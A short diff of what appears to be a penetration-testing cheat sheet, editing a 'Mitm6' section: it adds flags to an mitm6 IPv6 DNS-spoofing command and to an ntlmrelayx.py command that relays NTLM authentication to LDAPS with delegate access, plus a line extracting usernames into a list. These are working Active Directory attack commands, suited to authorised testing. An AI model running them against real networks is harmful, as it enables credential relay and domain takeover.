@@ -484,9 +484,9 @@
 ## Mitm6
 
 * Screen 1
-  * `mitm6 -d <domain>`
+  * `mitm6 -d <domain> --ignore-nofqdn`
 * Screen 2
-  * `ntlmrelayx.py -6 -t ldaps://<domain> -wh attacker-wpad`
+  * `ntlmrelayx.py -6 -t ldaps://<domain> -wh test-wpad --delegate-access`
 * Filter all usernames
   * `cat domain_users.grep | awk -F '\t' '{print $3}' | sort -u > users.txt`
 
